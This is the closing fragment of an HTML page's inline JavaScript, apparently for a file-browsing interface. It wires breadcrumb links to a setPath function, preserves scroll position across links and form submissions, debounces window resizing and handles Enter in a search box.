    document.querySelectorAll('.breadcrumb a').forEach(a => {
        if (!a.getAttribute('onclick')) {
            const href = a.getAttribute('href');
            try {
                const url = new URL(href, window.location.href);
                const p = url.searchParams.get('path');
                if (p) {
                    a.setAttribute('data-path', decodeURIComponent(p));
                    a.addEventListener('click', function() {
                        setPath(this.getAttribute('data-path'));
                    });
                }
            } catch(e) {}
        }
    });
    
    // Restore scroll position
    restoreScrollPosition();
    
    // Add scroll preservation to links
    document.querySelectorAll('a[href*="?"]:not([href*="logout"])').forEach(link => {
        link.addEventListener('click', function(e) {
            if (!this.href.includes('logout')) {
                saveScrollPosition();
            }
        });
    });
    
    // Add scroll preservation to forms
    document.querySelectorAll('form').forEach(form => {
        form.addEventListener('submit', saveScrollPosition);
    });
});

// Optimized resize handler
let resizeTimeout;
window.addEventListener('resize', () => {
    clearTimeout(resizeTimeout);
    resizeTimeout = setTimeout(() => {
        // Handle any resize-specific logic here
    }, 250);
});

// Prevent form submission on Enter in search
document.addEventListener('keydown', (e) => {
    if (e.key === 'Enter' && e.target.name === 'search') {
        saveScrollPosition();
    }
});
</script>
</body>
</html>
